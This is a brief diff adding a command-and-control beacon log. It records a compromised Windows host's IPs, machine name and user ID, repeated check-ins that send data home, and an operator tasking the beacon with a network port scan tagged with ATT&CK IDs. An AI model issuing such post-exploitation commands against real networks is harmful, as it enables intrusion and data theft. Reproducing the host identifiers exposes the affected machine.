@@ -1,0 +1,5 @@
+10/26 11:17:10 UTC [metadata] 39.144.7.83 <- 192.168.192.1; computer: DESKTOP-HDATA30; user: 101201905004; process: artifact.exe; pid: 13580; os: Windows; version: 6.2; beacon arch: x64 (x64)
+10/26 11:18:05 UTC [checkin] host called home, sent: 19 bytes
+10/26 11:20:53 UTC [input] <huan666> portscan null-255.255.255.255 1-1024,3389,5000-6000 arp 1024
+10/26 11:20:53 UTC [task] <T1046, T1093> Tasked beacon to scan ports 1-1024,3389,5000-6000 on null-255.255.255.255
+10/26 11:21:06 UTC [checkin] host called home, sent: 93257 bytes
